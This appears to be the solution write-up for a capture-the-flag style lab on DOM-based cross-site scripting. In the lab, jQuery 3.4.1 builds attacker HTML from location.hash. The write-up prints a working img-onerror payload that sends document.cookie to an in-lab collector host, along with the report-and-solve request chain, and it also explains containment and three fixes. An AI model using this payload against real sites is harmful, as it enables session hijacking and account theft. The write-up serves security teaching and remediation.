# Solution — DOM XSS via jQuery `$(location.hash)` Selector-to-Constructor

## Classification

**CWE-79 / OWASP A03:2021 – Injection.** This is a DOM-based cross-site
scripting flaw: an untrusted **source** (`location.hash`) flows into a dangerous
**sink** (the jQuery `$()` function) that can construct live DOM from a string,
entirely in the browser — the server never sees the payload.

## The sink

`GET /` ships this inline script (served with the vendored jQuery 3.4.1):

```js
var t = decodeURIComponent(location.hash.slice(1));
if (t) {
  $(t);
} // intended: $("#billing"); actual: $() on attacker HTML
```

jQuery's `$()` (aka `jQuery()`) is overloaded on its string argument:

- if the string looks like a **selector** (`#billing`, `.card`, `div > a`), it
  _queries_ the document;
- if the string looks like **HTML** (`<img ...>`), it **constructs** the
  described nodes and returns them as a jQuery set.

The disambiguation is jQuery's internal `rquickExpr` / `jQuery.parseHTML` path.
In jQuery **< 3.5** (this lab pins **3.4.1**) that path is loose: a string that
merely _contains_ a tag — even with leading whitespace — is treated as HTML to
build. So passing raw `location.hash` to `$()` means any attacker-controlled
fragment starting with a tag becomes constructed DOM.

Crucially, `$("<img src=x onerror=...>")` **constructs** the `<img>` even though
it is never inserted into the document. A detached `<img>` with a `src` still
triggers a resource load; `src=x` 404s; the element's `onerror` handler runs.
That is the execution primitive — no `.appendTo()`, no click, no server
reflection required.

## The delivery model

You cannot read the admin's cookie from your own browser (same-origin policy
scopes `document.cookie` to whoever loads the page). You need the **admin's**
browser to execute your JavaScript. `POST /report` is exactly that capability: it
queues a same-site path, and the admin bot visits it every ~2s while logged in.

The payload lives entirely in the URL **fragment** (`#...`). The fragment is
never sent to the server — the browser keeps it client-side and exposes it as
`location.hash`, which is precisely the sink's source. The bot navigates the full
path (fragment included) in a real headless Chromium, so `location.hash` carries
your payload and `$()` runs it. The bot's session cookie is **not** `HttpOnly`,
so JS can read it.

## The payload

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

`$()` constructs the `<img>`; `src=x` fails to load; `onerror` fires and does a
`new Image().src = …` beacon (a cross-origin GET not subject to the same-origin
_read_ barrier — the request still goes out, which is all we need).
`collector:9000` is the in-lab OOB listener.

## End-to-end

```
POST /report
Content-Type: application/json

{"url":"/#<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\">"}
# submit it URL-encoded in the fragment; wait for the bot to visit (~2s)

GET  /oob/received      # app-side proxy to the collector; find /report?c=session%3D<32hex>
POST /solve   {"c":"<32hex>"}     ->  FLAG{...}
```

`tests/exploit.py` automates this: submit the `/#<encoded payload>` path -> poll
`/oob/received` -> URL-decode and parse the 32-hex session -> `/solve`.

## Why the containment holds

- The collector and admin bot live on a `backend` network with `internal: true`
  — **no route off the host**. The stolen cookie can reach the in-lab collector
  but never the internet, so the lab ships a real cookie-exfil primitive at
  `risk: low`.
- `/internal/bot-login` (which mints the admin cookie) is firewalled to the
  backend subnet **and** gated by a `BOT_KEY`, so a lab visitor on the public
  side cannot request the admin cookie via `Set-Cookie` and skip the XSS.
- `/internal/queue` is likewise backend-only. The intended DOM-XSS path is the
  _only_ way to obtain the admin session.

## The fixes (independent — each one breaks the exploit)

1. **Never pass untrusted input to `$()`.** The intent was to select by id, so
   select by id:

   ```js
   var el = document.getElementById(t); // no HTML construction, ever
   // or, if you must use jQuery, constrain it to a query context and escape:
   // $(document).find("#" + $.escapeSelector(t));
   ```

   `document.getElementById` / `querySelector` treat `t` purely as a lookup key —
   `<img ...>` is simply "no element with that id", never constructed DOM. This
   kills the sink at the source.

2. **Upgrade jQuery to ≥ 3.5.** 3.5 tightened `htmlPrefilter` and the
   selector-vs-HTML disambiguation, shrinking (though **not** eliminating) what
   `$()` will construct from a string. Treat this as defence in depth, not the
   primary fix — `$(untrustedString)` is still dangerous on modern jQuery.
3. **`HttpOnly` session cookie.** `Set-Cookie: session=…; HttpOnly` makes
   `document.cookie` unable to read it, so even a successful script execution
   cannot steal the session. Defence in depth: fix the sink _and_ mark the cookie.

A strict `Content-Security-Policy` (no inline event handlers / `script-src`
without `unsafe-inline`) would also have blocked this specific payload; CSP is
explored in later labs.

## Note on the tech stack (re-platform)

The catalog entry for this pattern is a **static site** plus a vendored jQuery
file. This lab is **re-platformed to Flask** (per the project's Flask-default
Hybrid policy) purely to host the victim-bot delivery model, the `/report` queue,
the `/internal/*` firewall, the OOB collector proxy, and `/solve`. The vulnerable
code is unchanged and still entirely client-side: the Flask app just serves the
same static page and the vendored `jQuery 3.4.1` at `/vendor/lib.min.js`. The
end-of-life jQuery version is intentional — that version's loose
selector-vs-HTML behaviour **is** the vulnerability — so it is not upgraded.
